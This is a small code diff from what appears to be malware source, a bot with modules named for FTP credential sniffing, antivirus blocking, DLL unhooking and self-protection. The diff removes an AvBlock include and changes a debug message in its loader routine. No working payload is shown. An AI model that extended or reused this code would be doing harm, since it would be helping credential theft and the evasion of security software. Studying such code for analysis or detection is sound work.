@@ -1,7 +1,5 @@
 #include <windows.h>
 
-
-
 #include "BotCore.h"
 #include "DllLoader.h"
 
@@ -15,7 +13,6 @@
 #include "Config.h"
 #include "Crypt.h"
 #include "FtpSniffer.h"
-#include "AvBlock.h"
 #include "ntdll.h"
 #include "BotEvents.h"
 #include "Task.h"
@@ -105,7 +102,7 @@ DWORD WINAPI LoaderRoutine( LPVOID lpData )
 {
 	BOT::Initialize();
 	
-	MDBG("Main", "*************** LoaderRoutine ***************");
+	MDBG("Main", "*************** LoaderRoutine (PID:%d)", GetUniquePID());
 
 	UnhookDlls();
 	BOT::Protect(NULL);
